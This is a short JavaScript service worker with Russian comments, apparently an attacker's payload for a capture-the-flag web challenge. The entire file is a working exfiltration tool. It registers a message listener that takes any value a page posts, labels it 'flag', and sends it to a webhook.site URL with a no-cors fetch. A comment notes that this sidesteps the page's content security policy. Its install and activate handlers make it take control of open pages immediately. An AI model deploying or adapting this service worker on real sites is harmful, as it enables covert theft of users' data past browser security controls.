// 1. ЗАМЕНИТЕ ЭТОТ URL НА ВАШ УНИКАЛЬНЫЙ URL С WEBHOOK.SITE
const WEBHOOK_URL = "https://webhook.site/48f9efa9-a38a-4c44-b214-5bdde77e8adf";

console.log('[SW] Service Worker starting up...');

// Обработчик для получения сообщений от страниц
self.addEventListener('message', event => {
    console.log(`[SW] Message received: ${event.data}`);
    const flag = event.data;

    // Отправляем флаг на вебхук. Мы в своем контексте, CSP нам не мешает.
    fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(flag)}`, {
        mode: 'no-cors'
    });
});

// Эти обработчики нужны, чтобы SW активировался немедленно
self.addEventListener('install', event => {
    console.log('[SW] Installed.');
    self.skipWaiting();
});

self.addEventListener('activate', event => {
    console.log('[SW] Activated.');
    event.waitUntil(clients.claim());
});
